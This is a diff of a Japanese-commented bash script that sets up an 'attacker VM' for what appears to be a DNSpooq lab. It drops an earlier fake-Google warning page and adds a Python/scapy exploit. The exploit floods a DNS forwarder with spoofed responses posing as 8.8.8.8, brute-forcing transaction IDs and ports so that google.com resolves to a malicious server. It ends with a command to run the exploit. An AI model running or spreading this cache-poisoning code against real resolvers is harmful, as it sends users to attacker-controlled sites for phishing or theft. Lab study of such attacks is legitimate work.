@@ -1,105 +1,131 @@
+
 #!/bin/bash
 
-# 悪意のあるサーバーVMセットアップスクリプト
-echo "Setting up malicious server VM..."
+# 攻撃者VMセットアップスクリプト
+echo "Setting up attacker VM..."
 
 # 現在のIPアドレスを取得
 LOCAL_IP=$(ip route get 8.8.8.8 | grep -oP 'src \K\S+')
 echo "Local IP: $LOCAL_IP"
 
-# Apache2をインストール
+# 必要なパッケージをインストール
 sudo apt update
-sudo apt install -y apache2
+sudo apt install -y python3-pip python3-dev build-essential
 
-# 偽のGoogleページを作成
-sudo cat > /var/www/html/index.html << 'EOF'
-<!DOCTYPE html>
-<html lang="ja">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>警告 - DNS攻撃を検出しました</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #ff4444;
-            color: white;
-            text-align: center;
-            padding: 50px;
-            margin: 0;
-        }
-        .warning-box {
-            background-color: #cc0000;
-            border: 3px solid #fff;
-            border-radius: 10px;
-            padding: 30px;
-            max-width: 600px;
-            margin: 0 auto;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
-        }
-        h1 {
-            font-size: 2.5em;
-            margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }
-        .blink {
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0; }
-        }
-        .details {
-            background-color: rgba(0,0,0,0.3);
-            padding: 20px;
-            border-radius: 5px;
-            margin: 20px 0;
-            text-align: left;
-        }
-    </style>
-</head>
-<body>
-    <div class="warning-box">
-        <h1 class="blink">⚠️ 警告 ⚠️</h1>
-        <h2>DNSキャッシュポイズニング攻撃が成功しました！</h2>
-        <p>あなたは現在、<strong>偽のWebサイト</strong>にアクセスしています。</p>
-        
-        <div class="details">
-            <h3>攻撃の詳細:</h3>
-            <ul>
-                <li>本来のgoogle.comではなく、攻撃者が用意した偽のサーバーです</li>
-                <li>DNSの応答が改ざんされています</li>
-                <li>実際の攻撃では、個人情報を盗む悪意のあるサイトが表示される可能性があります</li>
-                <li>ユーザーは正規のサイトだと信じてしまう危険性があります</li>
-            </ul>
-        </div>
-        
-        <h3>教育目的のデモンストレーション</h3>
-        <p>これはDNSpooq脆弱性（CVE-2020-25686）のデモです。<br>
-        実際の環境では絶対に悪用しないでください。</p>
-        
-        <div class="details">
-            <strong>現在のサーバーIP:</strong> <span id="server-ip"></span><br>
-            <strong>アクセス時刻:</strong> <span id="access-time"></span>
-        </div>
-    </div>
+# Python依存関係をインストール
+pip3 install scapy
+
+# 攻撃スクリプトをダウンロード・作成
+cat > /root/exploit.py << 'EOF'
+#!/usr/bin/env python3
+import socket
+import threading
+import time
+import random
+from scapy.all import *
+
+def get_network_config():
+    """ネットワーク設定を動的に取得"""
+    local_ip = None
+    try:
+        result = subprocess.run(['ip', 'route', 'get', '8.8.8.8'], 
+                              capture_output=True, text=True)
+        for line in result.stdout.split('\n'):
+            if 'src' in line:
+                local_ip = line.split('src')[1].split()[0]
+                break
+    except:
+        pass
     
-    <script>
-        // サーバーIPを表示（クライアント側で取得される情報）
-        document.getElementById('server-ip').textContent = window.location.hostname || 'Unknown';
-        document.getElementById('access-time').textContent = new Date().toLocaleString('ja-JP');
-    </script>
-</body>
-</html>
+    if not local_ip:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+    
+    # ネットワークから他のホストを推定
+    network_base = '.'.join(local_ip.split('.')[:-1])
+    return {
+        'attacker_ip': local_ip,
+        'forwarder_ip': f"{network_base}.2",  # 通常forwarderは.2
+        'malicious_ip': f"{network_base}.5",  # 悪意のあるサーバーIP
+        'network_base': network_base
+    }
+
+def generate_queries(target_domain="google.com"):
+    """非キャッシュクエリを生成してポート/TXIDを推測"""
+    config = get_network_config()
+    
+    print("Querying non-cached names...")
+    for i in range(100):
+        random_domain = f"test{random.randint(1000, 9999)}.example.com"
+        query = IP(dst=config['forwarder_ip']) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=random_domain))
+        send(query, verbose=0)
+        time.sleep(0.01)
+
+def poison_cache():
+    """DNSキャッシュポイズニング攻撃を実行"""
+    config = get_network_config()
+    
+    print("Generating spoofed packets...")
+    target_domain = "google.com"
+    
+    sent_count = 0
+    start_time = time.time()
+    
+    for txid in range(1, 65536):
+        for src_port in range(1024, 65536, 100):
+            # 偽装DNS応答を作成
+            spoofed_response = (
+                IP(src="8.8.8.8", dst=config['forwarder_ip']) /
+                UDP(sport=53, dport=src_port) /
+                DNS(
+                    id=txid,
+                    qr=1,  # Response
+                    aa=1,  # Authoritative
+                    rd=1,  # Recursion Desired
+                    ra=1,  # Recursion Available
+                    qd=DNSQR(qname=target_domain),
+                    an=DNSRR(rrname=target_domain, rdata=config['malicious_ip'])
+                )
+            )
+            
+            send(spoofed_response, verbose=0)
+            sent_count += 1
+            
+            if sent_count % 10000 == 0:
+                elapsed = time.time() - start_time
+                print(f"Sent {sent_count} packets in {elapsed:.2f} seconds")
+            
+            if sent_count > 3000000:  # 制限を設ける
+                break
+        
+        if sent_count > 3000000:
+            break
+    
+    elapsed = time.time() - start_time
+    print(f"Poisoned: b'{target_domain}.' => {config['malicious_ip']}")
+    print(f"sent {sent_count} responses in {elapsed:.3f} seconds")
+
+def main():
+    config = get_network_config()
+    print(f"Attacker IP: {config['attacker_ip']}")
+    print(f"Target forwarder: {config['forwarder_ip']}")
+    print(f"Malicious server IP: {config['malicious_ip']}")
+    
+    # ステップ1: 非キャッシュクエリでポート/TXID範囲を推測
+    generate_queries()
+    
+    time.sleep(2)
+    
+    # ステップ2: キャッシュポイズニング攻撃
+    poison_cache()
+
+if __name__ == "__main__":
+    main()
 EOF
 
-# Apache2を起動・有効化
-sudo systemctl enable apache2
-sudo systemctl start apache2
+chmod +x /root/exploit.py
 
-# ポート80が開放されていることを確認
-sudo ufw allow 80
-
-echo "Malicious server setup completed!"
-echo "Server is running on IP: $LOCAL_IP"
-echo "Test with: curl http://$LOCAL_IP"
+echo "Attacker VM setup completed!"
+echo "Run the exploit with: python3 /root/exploit.py"
